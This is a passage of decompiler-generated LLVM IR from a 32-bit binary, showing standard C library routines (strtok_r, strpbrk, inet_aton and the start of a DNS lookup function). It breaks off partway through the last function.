  %v2_8052711 = add i32 %v4_805270d, %arg3
  %v1_80527237 = icmp eq i32 %arg3, 0
  br i1 %v1_80527237, label %dec_label_pc_805272b, label %dec_label_pc_8052727

dec_label_pc_8052715:                             ; preds = %dec_label_pc_8052727
  %v1_8052715 = add i32 %v0_8052715, -1
  %v5_8052716 = load i32, i32* @edx, align 4
  %v6_8052716 = and i32 %v5_8052716, -256
  %v7_8052716 = or i32 %v6_8052716, %v4_8052701
  store i32 %v7_8052716, i32* @edx, align 4
  %v1_805271a = inttoptr i32 %v1_8052715 to i8*
  %v2_805271a = load i8, i8* %v1_805271a, align 1
  %v15_805271a = icmp eq i8 %v2_805271a, %tmp
  br i1 %v15_805271a, label %dec_label_pc_80527a8, label %dec_label_pc_8052722

dec_label_pc_8052722:                             ; preds = %dec_label_pc_8052715
  %v1_8052722 = add i32 %v0_8052722, -1
  %v8_8052722 = icmp eq i32 %v1_8052722, 0
  br i1 %v8_8052722, label %dec_label_pc_805272b, label %dec_label_pc_8052727

dec_label_pc_8052727:                             ; preds = %entry, %dec_label_pc_8052722
  %v0_8052722 = phi i32 [ %v1_8052722, %dec_label_pc_8052722 ], [ %arg3, %entry ]
  %v0_8052715 = phi i32 [ %v1_8052715, %dec_label_pc_8052722 ], [ %v2_8052711, %entry ]
  %v2_8052727 = urem i32 %v0_8052715, 4
  %v3_8052727 = icmp eq i32 %v2_8052727, 0
  %v1_8052729 = icmp eq i1 %v3_8052727, false
  br i1 %v1_8052729, label %dec_label_pc_8052715, label %dec_label_pc_805272b

dec_label_pc_805272b:                             ; preds = %dec_label_pc_8052722, %dec_label_pc_8052727, %entry
  %v0_805278e.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8052722 ], [ %v0_8052722, %dec_label_pc_8052727 ]
  %v0_8052730 = phi i32 [ %v2_8052711, %entry ], [ %v1_8052715, %dec_label_pc_8052722 ], [ %v0_8052715, %dec_label_pc_8052727 ]
  store i32 %v0_8052730, i32* @ecx, align 4
  %v2_8052734 = mul nuw nsw i32 %v4_8052701, 256
  %v2_8052737 = or i32 %v2_8052734, %v4_8052701
  %v2_805273b = mul i32 %v2_8052737, 65536
  %v2_805273e = or i32 %v2_805273b, %v2_8052737
  %v6_805279150 = icmp ugt i32 %v0_805278e.pr, 3
  br i1 %v6_805279150, label %dec_label_pc_8052742, label %dec_label_pc_8052793

dec_label_pc_8052742:                             ; preds = %dec_label_pc_805272b, %dec_label_pc_805278b
  %v0_805278b52 = phi i32 [ %v1_805278b, %dec_label_pc_805278b ], [ %v0_805278e.pr, %dec_label_pc_805272b ]
  %v0_805274251 = phi i32 [ %v1_8052742, %dec_label_pc_805278b ], [ %v0_8052730, %dec_label_pc_805272b ]
  %v1_8052742 = add i32 %v0_805274251, -4
  store i32 %v1_8052742, i32* @ecx, align 4
  %v2_8052747 = inttoptr i32 %v1_8052742 to i32*
  %v3_8052747 = load i32, i32* %v2_8052747, align 4
  %v4_8052747 = xor i32 %v3_8052747, %v2_805273e
  %v1_8052749 = add i32 %v4_8052747, 2130640639
  %v1_805274f = sub i32 -1, %v4_8052747
  %v2_8052751 = xor i32 %v1_8052749, %v1_805274f
  %v1_8052753 = and i32 %v2_8052751, -2130640640
  %v2_8052753 = icmp eq i32 %v1_8052753, 0
  br i1 %v2_8052753, label %dec_label_pc_805278b, label %dec_label_pc_805275b

dec_label_pc_805275b:                             ; preds = %dec_label_pc_8052742
  %v7_805275b = or i32 %v1_8052753, %v4_8052701
  %v1_805275f = add i32 %v0_805274251, -1
  %v2_8052762 = inttoptr i32 %v1_805275f to i8*
  %v3_8052762 = load i8, i8* %v2_8052762, align 1
  %v16_8052762 = icmp eq i8 %v3_8052762, %tmp
  br i1 %v16_8052762, label %dec_label_pc_80527a8, label %dec_label_pc_8052767

dec_label_pc_8052767:                             ; preds = %dec_label_pc_805275b
  %v1_805276b = add i32 %v0_805274251, -2
  %v2_805276e = inttoptr i32 %v1_805276b to i8*
  %v3_805276e = load i8, i8* %v2_805276e, align 1
  %v16_805276e = icmp eq i8 %v3_805276e, %tmp
  br i1 %v16_805276e, label %dec_label_pc_80527a8, label %dec_label_pc_8052773

dec_label_pc_8052773:                             ; preds = %dec_label_pc_8052767
  %v1_8052777 = add i32 %v0_805274251, -3
  %v2_805277a = inttoptr i32 %v1_8052777 to i8*
  %v3_805277a = load i8, i8* %v2_805277a, align 1
  %v16_805277a = icmp eq i8 %v3_805277a, %tmp
  br i1 %v16_805277a, label %dec_label_pc_80527a8, label %dec_label_pc_805277f

dec_label_pc_805277f:                             ; preds = %dec_label_pc_8052773
  %v1_8052783 = inttoptr i32 %v1_8052742 to i8*
  %v2_8052783 = load i8, i8* %v1_8052783, align 1
  %v15_8052783 = icmp eq i8 %v2_8052783, %tmp
  %v1_8052785 = icmp eq i1 %v15_8052783, false
  br i1 %v1_8052785, label %dec_label_pc_805278b, label %dec_label_pc_8052787

dec_label_pc_8052787:                             ; preds = %dec_label_pc_805277f
  br label %dec_label_pc_80527a8

dec_label_pc_805278b:                             ; preds = %dec_label_pc_805277f, %dec_label_pc_8052742
  %v5_805279827 = phi i32 [ %v7_805275b, %dec_label_pc_805277f ], [ 0, %dec_label_pc_8052742 ]
  %v1_805278b = add i32 %v0_805278b52, -4
  %v6_8052791 = icmp ugt i32 %v1_805278b, 3
  br i1 %v6_8052791, label %dec_label_pc_8052742, label %dec_label_pc_8052793

dec_label_pc_8052793:                             ; preds = %dec_label_pc_805278b, %dec_label_pc_805272b
  %v5_805279826.lcssa = phi i32 [ %v4_8052701, %dec_label_pc_805272b ], [ %v5_805279827, %dec_label_pc_805278b ]
  %v0_8052742.lcssa = phi i32 [ %v0_8052730, %dec_label_pc_805272b ], [ %v1_8052742, %dec_label_pc_805278b ]
  %v0_805278b.lcssa = phi i32 [ %v0_805278e.pr, %dec_label_pc_805272b ], [ %v1_805278b, %dec_label_pc_805278b ]
  br label %dec_label_pc_80527a0

dec_label_pc_8052797:                             ; preds = %dec_label_pc_80527a0
  %v1_80527a0 = add i32 %v0_80527a0, -1
  %v1_8052797 = add i32 %v0_8052797, -1
  %v6_8052798 = and i32 %v5_8052798, -256
  %v7_8052798 = or i32 %v6_8052798, %v4_8052701
  %v1_805279c = inttoptr i32 %v1_8052797 to i8*
  %v2_805279c = load i8, i8* %v1_805279c, align 1
  %v15_805279c = icmp eq i8 %v2_805279c, %tmp
  br i1 %v15_805279c, label %dec_label_pc_80527a8, label %dec_label_pc_80527a0

dec_label_pc_80527a0:                             ; preds = %dec_label_pc_8052797, %dec_label_pc_8052793
  %v5_8052798 = phi i32 [ %v7_8052798, %dec_label_pc_8052797 ], [ %v5_805279826.lcssa, %dec_label_pc_8052793 ]
  %v0_8052797 = phi i32 [ %v1_8052797, %dec_label_pc_8052797 ], [ %v0_8052742.lcssa, %dec_label_pc_8052793 ]
  %v0_80527a0 = phi i32 [ %v1_80527a0, %dec_label_pc_8052797 ], [ %v0_805278b.lcssa, %dec_label_pc_8052793 ]
  %v10_80527a1 = icmp eq i32 %v0_80527a0, 0
  %v1_80527a4 = icmp eq i1 %v10_80527a1, false
  br i1 %v1_80527a4, label %dec_label_pc_8052797, label %dec_label_pc_80527a6

dec_label_pc_80527a6:                             ; preds = %dec_label_pc_80527a0
  br label %dec_label_pc_80527a8

dec_label_pc_80527a8:                             ; preds = %dec_label_pc_8052715, %dec_label_pc_8052773, %dec_label_pc_8052767, %dec_label_pc_805275b, %dec_label_pc_8052797, %dec_label_pc_8052787, %dec_label_pc_80527a6
  %v0_80527ab = phi i32 [ %v1_8052742, %dec_label_pc_8052787 ], [ 0, %dec_label_pc_80527a6 ], [ %v1_8052797, %dec_label_pc_8052797 ], [ %v1_8052777, %dec_label_pc_8052773 ], [ %v1_805276b, %dec_label_pc_8052767 ], [ %v1_805275f, %dec_label_pc_805275b ], [ %v1_8052715, %dec_label_pc_8052715 ]
  ret i32 %v0_80527ab

; uselistorder directives
  uselistorder i32 %v0_80527a0, { 1, 0 }
  uselistorder i32 %v1_805278b, { 0, 2, 1 }
  uselistorder i32 %v1_8052742, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805274251, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8052737, { 1, 0 }
  uselistorder i32 %v0_8052715, { 1, 0, 2 }
  uselistorder i32 %v2_8052711, { 1, 0 }
  uselistorder i32 %v4_8052701, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 7, 0, 16, 17, 1, 15, 19, 14, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80527a8, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052742, { 1, 0 }
  uselistorder label %dec_label_pc_805272b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052727, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80527ac = load i32, i32* @edi, align 4
  %v0_80527ad = load i32, i32* @esi, align 4
  %v0_80527ae = load i32, i32* @ebx, align 4
  store i32 %v0_80527ae, i32* %stack_var_-12, align 4
  %v4_80527af = ptrtoint i8* %arg1 to i32
  store i32 %v4_80527af, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80527bb = icmp eq i8* %arg1, null
  %v1_80527bd = icmp eq i1 %v1_80527bb, false
  br i1 %v1_80527bd, label %dec_label_pc_80527c1, label %dec_label_pc_80527bf

dec_label_pc_80527bf:                             ; preds = %entry
  %v1_80527bf = inttoptr i32 %arg3 to i32*
  %v2_80527bf = load i32, i32* %v1_80527bf, align 4
  store i32 %v2_80527bf, i32* @ebx, align 4
  br label %dec_label_pc_80527c1

dec_label_pc_80527c1:                             ; preds = %entry, %dec_label_pc_80527bf
  %v0_80527c4 = phi i32 [ %v4_80527af, %entry ], [ %v2_80527bf, %dec_label_pc_80527bf ]
  %v0_80527c1 = load i32, i32* @ecx, align 4
  %v5_80527c4 = inttoptr i32 %v0_80527c4 to i8*
  %v8_80527c5 = call i32 @__GI_strspn(i8* %v5_80527c4, i32 %arg2, i32 %v0_80527c1, i32 %v0_80527c1)
  store i32 %v8_80527c5, i32* %eax.global-to-local, align 4
  %v0_80527cd = load i32, i32* @ebx, align 4
  %v2_80527cd = add i32 %v0_80527cd, %v8_80527c5
  store i32 %v2_80527cd, i32* @ebx, align 4
  %v1_80527cf = inttoptr i32 %v2_80527cd to i8*
  %v2_80527cf = load i8, i8* %v1_80527cf, align 1
  %v3_80527cf = icmp eq i8 %v2_80527cf, 0
  %v1_80527d2 = icmp eq i1 %v3_80527cf, false
  br i1 %v1_80527d2, label %dec_label_pc_80527da, label %dec_label_pc_80527d4

dec_label_pc_80527d4:                             ; preds = %dec_label_pc_80527c1
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80527d6 = load i32, i32* @esi, align 4
  %v2_80527d6 = inttoptr i32 %v1_80527d6 to i32*
  store i32 %v2_80527cd, i32* %v2_80527d6, align 4
  %v0_8052804.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052801

dec_label_pc_80527da:                             ; preds = %dec_label_pc_80527c1
  %v0_80527da = load i32, i32* @edx, align 4
  %v0_80527dc = load i32, i32* @edi, align 4
  %v8_80527de = call i32 @__GI_strpbrk(i8* %v1_80527cf, i32 %v0_80527dc, i32 %v0_80527da, i32 %v0_80527da)
  store i32 %v8_80527de, i32* %eax.global-to-local, align 4
  %v2_80527e6 = icmp eq i32 %v8_80527de, 0
  %v1_80527e8 = icmp eq i1 %v2_80527e6, false
  br i1 %v1_80527e8, label %dec_label_pc_80527f9, label %dec_label_pc_80527ea

dec_label_pc_80527ea:                             ; preds = %dec_label_pc_80527da
  %v0_80527ee = load i32, i32* @ebx, align 4
  %v5_80527ee = inttoptr i32 %v0_80527ee to i8*
  %v8_80527ef = call i32 @rawmemchr(i8* %v5_80527ee, i32 0, i32 %v8_80527de, i32 %v8_80527de)
  br label %dec_label_pc_80527fd

dec_label_pc_80527f9:                             ; preds = %dec_label_pc_80527da
  %v9_80527de = inttoptr i32 %v8_80527de to i8*
  store i8 0, i8* %v9_80527de, align 1
  %v2_80527fc = add i32 %v8_80527de, 1
  br label %dec_label_pc_80527fd

dec_label_pc_80527fd:                             ; preds = %dec_label_pc_80527ea, %dec_label_pc_80527f9
  %storemerge = phi i32 [ %v2_80527fc, %dec_label_pc_80527f9 ], [ %v8_80527ef, %dec_label_pc_80527ea ]
  %v0_80527fd = phi i32 [ %v2_80527fc, %dec_label_pc_80527f9 ], [ %v8_80527ef, %dec_label_pc_80527ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80527fd = load i32, i32* @esi, align 4
  %v2_80527fd = inttoptr i32 %v1_80527fd to i32*
  store i32 %v0_80527fd, i32* %v2_80527fd, align 4
  %v0_80527ff = load i32, i32* @ebx, align 4
  store i32 %v0_80527ff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052801

dec_label_pc_8052801:                             ; preds = %dec_label_pc_80527d4, %dec_label_pc_80527fd
  %v0_8052804 = phi i32 [ %v0_8052804.pre, %dec_label_pc_80527d4 ], [ %v0_80527ff, %dec_label_pc_80527fd ]
  %v2_8052801 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052801, i32* @ebx, align 4
  store i32 %v0_80527ad, i32* @esi, align 4
  store i32 %v0_80527ac, i32* @edi, align 4
  ret i32 %v0_8052804

; uselistorder directives
  uselistorder i32 %v8_80527de, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052801, { 1, 0 }
  uselistorder label %dec_label_pc_80527fd, { 1, 0 }
  uselistorder label %dec_label_pc_80527c1, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052809 = load i32, i32* @ebx, align 4
  %v2_805282024 = load i8, i8* %arg1, align 1
  %v4_805282228 = icmp eq i8 %v2_805282024, 0
  br i1 %v4_805282228, label %dec_label_pc_805282a, label %dec_label_pc_8052826.lr.ph

dec_label_pc_8052826.lr.ph:                       ; preds = %entry
  %v3_805282025 = zext i8 %v2_805282024 to i32
  %v5_805282026 = and i32 %v0_8052809, -256
  %v6_805282027 = or i32 %v3_805282025, %v5_805282026
  %v4_805280e = ptrtoint i8* %arg1 to i32
  %v1_805281913 = inttoptr i32 %arg2 to i8*
  %v4_8052819.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052826

dec_label_pc_8052814:                             ; preds = %dec_label_pc_8052826, %dec_label_pc_8052818
  %v6_805281922 = phi i32 [ %v6_8052819, %dec_label_pc_8052818 ], [ %v6_805281917, %dec_label_pc_8052826 ]
  %v2_805281921 = phi i8 [ %v2_8052819, %dec_label_pc_8052818 ], [ %v2_805281914, %dec_label_pc_8052826 ]
  %v0_805281820 = phi i32 [ %v1_8052818, %dec_label_pc_8052818 ], [ %arg2, %dec_label_pc_8052826 ]
  %v15_8052814 = icmp eq i8 %v2_805281921, %v2_805282031
  br i1 %v15_8052814, label %dec_label_pc_805282c, label %dec_label_pc_8052818

dec_label_pc_8052818:                             ; preds = %dec_label_pc_8052814
  %v1_8052818 = add i32 %v0_805281820, 1
  store i32 %v1_8052818, i32* @edx, align 4
  %v1_8052819 = inttoptr i32 %v1_8052818 to i8*
  %v2_8052819 = load i8, i8* %v1_8052819, align 1
  %v3_8052819 = zext i8 %v2_8052819 to i32
  %v5_8052819 = and i32 %v6_805281922, -256
  %v6_8052819 = or i32 %v3_8052819, %v5_8052819
  store i32 %v6_8052819, i32* @ecx, align 4
  %v4_805281b = icmp eq i8 %v2_8052819, 0
  %v1_805281d = icmp eq i1 %v4_805281b, false
  br i1 %v1_805281d, label %dec_label_pc_8052814, label %dec_label_pc_805281f

dec_label_pc_805281f:                             ; preds = %dec_label_pc_8052818, %dec_label_pc_8052826
  %v4_8052819.pre34 = phi i32 [ %v6_805281917, %dec_label_pc_8052826 ], [ %v6_8052819, %dec_label_pc_8052818 ]
  %v1_805281f = add i32 %v0_805281f29, 1
  %v1_8052820 = inttoptr i32 %v1_805281f to i8*
  %v2_8052820 = load i8, i8* %v1_8052820, align 1
  %v3_8052820 = zext i8 %v2_8052820 to i32
  %v5_8052820 = and i32 %v6_805282032, -256
  %v6_8052820 = or i32 %v3_8052820, %v5_8052820
  %v4_8052822 = icmp eq i8 %v2_8052820, 0
  br i1 %v4_8052822, label %dec_label_pc_805282a, label %dec_label_pc_8052826

dec_label_pc_8052826:                             ; preds = %dec_label_pc_8052826.lr.ph, %dec_label_pc_805281f
  %v4_8052819.pre = phi i32 [ %v4_8052819.pre.pre, %dec_label_pc_8052826.lr.ph ], [ %v4_8052819.pre34, %dec_label_pc_805281f ]
  %v6_805282032 = phi i32 [ %v6_805282027, %dec_label_pc_8052826.lr.ph ], [ %v6_8052820, %dec_label_pc_805281f ]
  %v2_805282031 = phi i8 [ %v2_805282024, %dec_label_pc_8052826.lr.ph ], [ %v2_8052820, %dec_label_pc_805281f ]
  %v0_805281f29 = phi i32 [ %v4_805280e, %dec_label_pc_8052826.lr.ph ], [ %v1_805281f, %dec_label_pc_805281f ]
  store i32 %arg2, i32* @edx, align 4
  %v2_805281914 = load i8, i8* %v1_805281913, align 1
  %v3_805281915 = zext i8 %v2_805281914 to i32
  %v5_805281916 = and i32 %v4_8052819.pre, -256
  %v6_805281917 = or i32 %v3_805281915, %v5_805281916
  store i32 %v6_805281917, i32* @ecx, align 4
  %v4_805281b18 = icmp eq i8 %v2_805281914, 0
  %v1_805281d19 = icmp eq i1 %v4_805281b18, false
  br i1 %v1_805281d19, label %dec_label_pc_8052814, label %dec_label_pc_805281f

dec_label_pc_805282a:                             ; preds = %dec_label_pc_805281f, %entry
  br label %dec_label_pc_805282c

dec_label_pc_805282c:                             ; preds = %dec_label_pc_8052814, %dec_label_pc_805282a
  %v0_805282e = phi i32 [ 0, %dec_label_pc_805282a ], [ %v0_805281f29, %dec_label_pc_8052814 ]
  store i32 %v0_8052809, i32* @ebx, align 4
  ret i32 %v0_805282e

; uselistorder directives
  uselistorder i32 %v6_805281917, { 2, 0, 1 }
  uselistorder i8 %v2_805281914, { 1, 2, 0 }
  uselistorder i32 %v1_805281f, { 1, 0 }
  uselistorder i32 %v6_8052819, { 1, 2, 0 }
  uselistorder i8 %v2_8052819, { 1, 2, 0 }
  uselistorder i32 %v1_8052818, { 2, 1, 0 }
  uselistorder i8 %v2_805282024, { 0, 2, 1 }
  uselistorder i32 %v0_8052809, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805282c, { 1, 0 }
  uselistorder label %dec_label_pc_8052826, { 1, 0 }
  uselistorder label %dec_label_pc_805281f, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052837 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052837, i32* @ecx, align 4
  %v1_805283b = icmp eq i8* %arg1, null
  br i1 %v1_805283b, label %dec_label_pc_80528bc, label %dec_label_pc_805283f

dec_label_pc_805283f:                             ; preds = %entry
  %v0_805284d.pre = load i32, i32* @global_var_8059eb8, align 8
  br label %dec_label_pc_805284a

dec_label_pc_805284a:                             ; preds = %dec_label_pc_805283f, %dec_label_pc_8052893
  %v2_805289635 = phi i32 [ 1, %dec_label_pc_805283f ], [ %v3_8052896, %dec_label_pc_8052893 ]
  %v0_805284a34 = phi i32 [ %v4_8052837, %dec_label_pc_805283f ], [ %v0_805284a3, %dec_label_pc_8052893 ]
  %v0_80528b133 = phi i32 [ 0, %dec_label_pc_805283f ], [ %v2_8052899, %dec_label_pc_8052893 ]
  %v1_805284a = inttoptr i32 %v0_805284a34 to i8*
  %v2_805284a = load i8, i8* %v1_805284a, align 1
  %v3_805284a = sext i8 %v2_805284a to i32
  %v2_8052853 = mul nsw i32 %v3_805284a, 2
  %v3_8052853 = add i32 %v2_8052853, %v0_805284d.pre
  %v4_8052853 = inttoptr i32 %v3_8052853 to i8*
  %v5_8052853 = load i8, i8* %v4_8052853, align 1
  %v6_8052853 = and i8 %v5_8052853, 8
  %v7_8052853 = icmp eq i8 %v6_8052853, 0
  br i1 %v7_8052853, label %dec_label_pc_80528bc, label %dec_label_pc_805285a

dec_label_pc_805285a:                             ; preds = %dec_label_pc_805284a
  %v4_805286e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805286e

dec_label_pc_805285e:                             ; preds = %dec_label_pc_805286e
  %v3_805285e = mul i32 %v1_805285e, 10
  %v2_8052861 = add i32 %v3_805285e, -48
  %v3_8052861 = add i32 %v2_8052861, %v2_8052870
  %v1_8052865 = add i32 %v3_8052861, -255
  %v6_8052865 = sub i32 254, %v3_8052861
  %v7_8052865 = and i32 %v6_8052865, %v3_8052861
  %v8_8052865 = icmp slt i32 %v7_8052865, 0
  %v9_8052865 = icmp eq i32 %v1_8052865, 0
  %v10_8052865 = icmp slt i32 %v1_8052865, 0
  %v3_805286b = icmp eq i1 %v10_8052865, %v8_8052865
  %v4_805286b = icmp eq i1 %v9_8052865, false
  %v5_805286b = and i1 %v4_805286b, %v3_805286b
  br i1 %v5_805286b, label %dec_label_pc_80528bc, label %dec_label_pc_805286d

dec_label_pc_805286d:                             ; preds = %dec_label_pc_805285e
  %v1_805286d = add i32 %v0_805286d, 1
  store i32 %v1_805286d, i32* @ecx, align 4
  br label %dec_label_pc_805286e

dec_label_pc_805286e:                             ; preds = %dec_label_pc_805285a, %dec_label_pc_805286d
  %v1_805285e = phi i32 [ 0, %dec_label_pc_805285a ], [ %v3_8052861, %dec_label_pc_805286d ]
  %v4_805286e = phi i32 [ %v4_805286e.pre, %dec_label_pc_805285a ], [ %v6_805286e, %dec_label_pc_805286d ]
  %v0_805286d = phi i32 [ %v0_805284a34, %dec_label_pc_805285a ], [ %v1_805286d, %dec_label_pc_805286d ]
  %v1_805286e = inttoptr i32 %v0_805286d to i8*
  %v2_805286e = load i8, i8* %v1_805286e, align 1
  %v3_805286e = zext i8 %v2_805286e to i32
  %v5_805286e = and i32 %v4_805286e, -256
  %v6_805286e = or i32 %v3_805286e, %v5_805286e
  store i32 %v6_805286e, i32* @edx, align 4
  %v2_8052870 = sext i8 %v2_805286e to i32
  %v2_8052873 = mul nsw i32 %v2_8052870, 2
  %v3_8052873 = add i32 %v2_8052873, %v0_805284d.pre
  %v4_8052873 = inttoptr i32 %v3_8052873 to i16*
  %v5_8052873 = load i16, i16* %v4_8052873, align 2
  %v2_8052878 = and i16 %v5_8052873, 8
  %v3_8052878 = icmp eq i16 %v2_8052878, 0
  %v1_805287a = icmp eq i1 %v3_8052878, false
  br i1 %v1_805287a, label %dec_label_pc_805285e, label %dec_label_pc_805287c

dec_label_pc_805287c:                             ; preds = %dec_label_pc_805286e
  %v8_805287c = sub nsw i32 2, %v2_805289635
  %v9_805287c = and i32 %v8_805287c, %v2_805289635
  %v10_805287c = icmp slt i32 %v9_805287c, 0
  %v11_805287c = icmp eq i32 %v2_805289635, 3
  %v12_805287c = icmp slt i32 %v2_805289635, 3
  %v3_8052880 = icmp eq i1 %v12_805287c, %v10_805287c
  %v4_8052880 = icmp eq i1 %v11_805287c, false
  %v5_8052880 = and i1 %v4_8052880, %v3_8052880
  br i1 %v5_8052880, label %dec_label_pc_805288a, label %dec_label_pc_8052882

dec_label_pc_8052882:                             ; preds = %dec_label_pc_805287c
  %v10_8052882 = icmp eq i8 %v2_805286e, 46
  %v1_8052885 = icmp eq i1 %v10_8052882, false
  br i1 %v1_8052885, label %dec_label_pc_80528bc, label %dec_label_pc_8052887

dec_label_pc_8052887:                             ; preds = %dec_label_pc_8052882
  %v1_8052887 = add i32 %v0_805286d, 1
  store i32 %v1_8052887, i32* @ecx, align 4
  br label %dec_label_pc_8052893

dec_label_pc_805288a:                             ; preds = %dec_label_pc_805287c
  %v1_805288a = add i32 %v0_805286d, 1
  store i32 %v1_805288a, i32* @ecx, align 4
  %v4_805288b = icmp eq i8 %v2_805286e, 0
  br i1 %v4_805288b, label %dec_label_pc_8052893, label %dec_label_pc_805288f

dec_label_pc_805288f:                             ; preds = %dec_label_pc_805288a
  %v2_805288f = and i16 %v5_8052873, 32
  %v3_805288f = icmp eq i16 %v2_805288f, 0
  br i1 %v3_805288f, label %dec_label_pc_80528bc, label %dec_label_pc_8052893

dec_label_pc_8052893:                             ; preds = %dec_label_pc_805288f, %dec_label_pc_805288a, %dec_label_pc_8052887
  %v0_805284a3 = phi i32 [ %v1_805288a, %dec_label_pc_805288f ], [ %v1_805288a, %dec_label_pc_805288a ], [ %v1_8052887, %dec_label_pc_8052887 ]
  %v2_8052893 = mul i32 %v0_80528b133, 256
  %v3_8052896 = add nuw nsw i32 %v2_805289635, 1
  %v2_8052899 = or i32 %v1_805285e, %v2_8052893
  %v7_805289f = icmp sgt i32 %v2_805289635, 3
  br i1 %v7_805289f, label %dec_label_pc_80528a1, label %dec_label_pc_805284a

dec_label_pc_80528a1:                             ; preds = %dec_label_pc_8052893
  %v4_80528a6 = icmp eq i32 %arg2, 0
  br i1 %v4_80528a6, label %dec_label_pc_80528be, label %dec_label_pc_80528ad

dec_label_pc_80528ad:                             ; preds = %dec_label_pc_80528a1
  %v1_80528b1 = call i32 @llvm.bswap.i32(i32 %v2_8052899)
  %v2_80528b3 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80528b1, i32* %v2_80528b3, align 4
  br label %dec_label_pc_80528be

dec_label_pc_80528bc:                             ; preds = %dec_label_pc_805288f, %dec_label_pc_8052882, %dec_label_pc_805284a, %dec_label_pc_805285e, %entry
  br label %dec_label_pc_80528be

dec_label_pc_80528be:                             ; preds = %dec_label_pc_80528a1, %dec_label_pc_80528ad, %dec_label_pc_80528bc
  %v0_80528c3 = phi i32 [ 1, %dec_label_pc_80528a1 ], [ 1, %dec_label_pc_80528ad ], [ 0, %dec_label_pc_80528bc ]
  ret i32 %v0_80528c3

; uselistorder directives
  uselistorder i32 %v2_8052870, { 1, 0 }
  uselistorder i32 %v6_805286e, { 1, 0 }
  uselistorder i8 %v2_805286e, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805286d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8052865, { 1, 0 }
  uselistorder i32 %v3_8052861, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805284a34, { 1, 0 }
  uselistorder i32 %v2_805289635, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80528be, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80528bc, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805286e, { 1, 0 }
  uselistorder label %dec_label_pc_805284a, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_80528da = call i32 @malloc(i32 512)
  store i32 %v2_80528da, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_80528da, i32* @ebp, align 4
  %v2_80528e8 = call i32 @malloc(i32 1025)
  store i32 %v2_80528e8, i32* %eax.global-to-local, align 4
  %v12_80528f1 = ptrtoint i32* %stack_var_-236 to i32
  %v1_80528f4 = icmp eq i32 %v2_80528da, 0
  br i1 %v1_80528f4, label %dec_label_pc_8052f6d, label %dec_label_pc_80528fc

dec_label_pc_80528fc:                             ; preds = %entry
  %v1_80528fc = icmp eq i32 %v2_80528e8, 0
  br i1 %v1_80528fc, label %dec_label_pc_8052f6d, label %dec_label_pc_8052904

dec_label_pc_8052904:                             ; preds = %dec_label_pc_80528fc
  %v5_8052904 = icmp eq i32 %arg2, 0
  br i1 %v5_8052904, label %dec_label_pc_8052f6d, label %dec_label_pc_8052912

dec_label_pc_8052912:                             ; preds = %dec_label_pc_8052904
  %v4_8052912 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052912, i32* %eax.global-to-local, align 4
  %v2_8052919 = load i8, i8* %arg1, align 1
  %v3_8052919 = icmp eq i8 %v2_8052919, 0
  br i1 %v3_8052919, label %dec_label_pc_8052f6d, label %dec_label_pc_8052922

dec_label_pc_8052922:                             ; preds = %dec_label_pc_8052912
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8052926 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8052926, i32* @eax, align 4
  store i32 %v4_8052912, i32* %edx.global-to-local, align 4
  %v2_8052949 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8052949, i32* @ebx, align 4
